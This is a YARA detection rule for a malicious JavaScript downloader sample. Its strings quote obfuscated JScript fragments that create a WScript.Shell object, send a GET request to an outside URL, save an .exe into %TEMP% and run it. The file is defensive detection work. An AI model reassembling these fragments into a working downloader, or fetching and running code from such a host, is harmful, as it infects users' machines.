rule sig_20160401_05884d61fa51d804edd5c91b04def212 {
  meta:
    description = "datamaliciousorder - file 20160401_05884d61fa51d804edd5c91b04def212.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a3af9bbd0a79e3be8086b70cc42d913204c7c5c579500339fbf3c454908079a"

  strings:
    $s1  = "var CeErh = function MwtVnj() {return WScript[RrVv](\"WScript\"+\".Shell\");}(), WqYg = 11;" fullword ascii
    $s2  = "function HttCc(LjcXti, MwpIgo){HdEg = HdEg * 1; return LjcXti - MwpIgo;};" fullword ascii
    $s3  = "UdJsi[DdpWs](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s4  = "if (UdJsi[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QeZua() {return CeErh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"chqat19f2tCvfcG.ex\" + \"e\";};" fullword ascii
    $s6  = "function UroYs(){return UgmZg + \"\";};" fullword ascii
    $s7  = "function FzMnd() {return ((IjvRy == true) && (IjvRy == SzhIjs)) ? 1 : HdEg;};" fullword ascii
    $s8  = "function AoRv(UnZpm){CeErh[\"R\"+\"un\"](UnZpm, HdEg, HdEg);};" fullword ascii
    $s9  = "function HsVtt()" fullword ascii
    $s10 = "var WrbNfv = new this[\"Date\"]();" fullword ascii
    $s11 = "function MmNk(){return 23;};" fullword ascii
    $s12 = "var IjvRy = false;" fullword ascii
    $s13 = "return HttCc(PtiTgc, LyZk);" fullword ascii
    $s14 = "}while (WpyCbq);" fullword ascii
    $s15 = "function FbLo(){return RrVv;};" fullword ascii
    $s16 = "var MbLum = false;" fullword ascii
    $s17 = "SzhIjs = true; " fullword ascii
    $s18 = "function KfEe(LiQnv) {var ReGyu = (1, 2, 3, 4, 5, LiQnv); return ReGyu;};" fullword ascii
    $s19 = "var SzhIjs = false;" fullword ascii
    $s20 = "IjvRy = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}